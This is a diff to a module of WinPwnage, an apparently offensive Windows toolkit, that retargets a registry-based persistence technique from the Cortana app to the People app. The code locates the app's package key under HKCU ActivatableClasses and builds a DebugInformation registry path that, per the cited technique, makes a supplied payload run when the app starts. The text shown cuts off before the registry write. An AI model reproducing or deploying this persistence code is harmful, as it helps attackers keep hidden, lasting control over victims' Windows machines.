@@ -8,7 +8,7 @@ from winpwnage.core.utils import *
 #https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/
 
 persistMethod10_info = {
-	"Description": "Persistence using Cortana windows app",
+	"Description": "Persistence using People windows app",
 	"Method": "Registry key (Class) manipulation",
 	"Id": "10",
 	"Type": "Persistence",
@@ -19,12 +19,15 @@ persistMethod10_info = {
 	"Function Payload": True,
 }
 
-def find_cortana():
+def find_people():
 	index = 0
-	cortana_version = []
+	people_version = []
 	
 	try:
-		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Software\Classes\ActivatableClasses\Package", 0, _winreg.KEY_READ)
+		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,
+								"Software\Classes\ActivatableClasses\Package",
+								0,
+								_winreg.KEY_READ)
 	except Exception as error:
 		print_error("Unable to open registry key, exception was raised: {}".format(error))
 		return False
@@ -32,20 +35,21 @@ def find_cortana():
 	try:
 		num = _winreg.QueryInfoKey(key)[0]
 		for x in range(0, num):
-			if "Microsoft.Windows.Cortana_" in _winreg.EnumKey(key, x):
-				cortana_version.append(_winreg.EnumKey(key, x))
+			if "Microsoft.People_" in _winreg.EnumKey(key, x):
+				people_version.append(_winreg.EnumKey(key, x))
 				break
 	except WindowsError as error:
 		pass
-	return cortana_version
+		
+	return people_version
 
 def persistMethod10(payload, add=True):
 	try:
 		kpath = os.path.join("Software\Classes\ActivatableClasses\Package",
-								find_cortana()[0],
-								"DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca")
+								find_people()[0],
+								"DebugInformation\\x4c7a3b7dy2188y46d4ya362y19ac5a5805e5x.AppX368sbpk1kx658x0p332evjk2v0y02kxp.mca")
 	except IndexError:
-		print_error("Unable to add persistence, Cortana is unavailable on this system")
+		print_error("Unable to add persistence, People app is unavailable on this system")
 		return False
 
 	if add:
